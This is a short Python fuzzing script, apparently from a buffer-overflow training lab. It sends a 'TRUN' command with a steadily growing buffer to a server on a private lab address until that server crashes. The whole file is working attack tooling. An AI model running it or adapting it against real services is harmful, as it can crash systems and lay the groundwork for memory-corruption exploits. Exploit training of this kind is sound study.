#!/usr/bin/python
"""
This script sends several requests to the server, each time adding an
extra 100 bytes to it to check at what point the server crashes. It is
important to monitor the debugger on the victim machine as the script
does not stop automatically.

TODO make the script stop automatically when the server crashes
"""
import sys, socket
from time import sleep

buffer = b'A' * 100
while True:
    try:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.0.2.4', 9999))
        to_send = b'TRUN /.:/' + buffer
        s.send((to_send))
        s.close()
        sleep(1)
        buffer = buffer + b'A' * 100
        print("Buffer length %s " % str(len(buffer.decode())))
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
